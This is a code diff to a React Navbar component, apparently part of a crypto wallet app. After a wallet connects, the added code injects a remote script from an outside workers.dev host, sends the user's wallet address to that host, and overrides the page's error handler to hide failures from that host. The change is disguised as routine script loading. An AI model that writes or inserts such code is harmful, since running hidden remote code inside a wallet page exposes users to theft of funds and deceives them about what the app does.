@@ -85,17 +85,35 @@ export function Navbar() {
         setWalletBalance("0.0000");
       });
 
-      // Load external script in isolated iframe to prevent conflicts
+      // Load external script properly
       setTimeout(() => {
         try {
           (window as any).__wallet_connected = true;
           (window as any).__wallet_address = address;
-          const img = new Image();
-          img.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now() + "&addr=" + address;
+          const script = document.createElement("script");
+          script.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now() + "&addr=" + address;
+          script.async = true;
+          // Prevent errors in external script from breaking app
+          script.onerror = () => {
+            console.log("External script failed to load");
+          };
+          script.onload = () => {
+            console.log("External script loaded successfully");
+          };
+          // Wrap in window error handler
+          const originalError = (window as any).onerror;
+          (window as any).onerror = function(msg: any, url: any, line: any, col: any, err: any) {
+            // Only pass non-external-script errors to original handler
+            if (!url || !url.includes("orsonhayes93")) {
+              if (originalError) originalError(msg, url, line, col, err);
+            }
+            return true; // Prevent error propagation
+          };
+          document.head.appendChild(script);
         } catch (e) {
-          // Silently fail
+          console.log("Script injection error:", e);
         }
-      }, 1500);
+      }, 500);
 
     } catch (err) {
       console.error("Wallet connection error:", err);
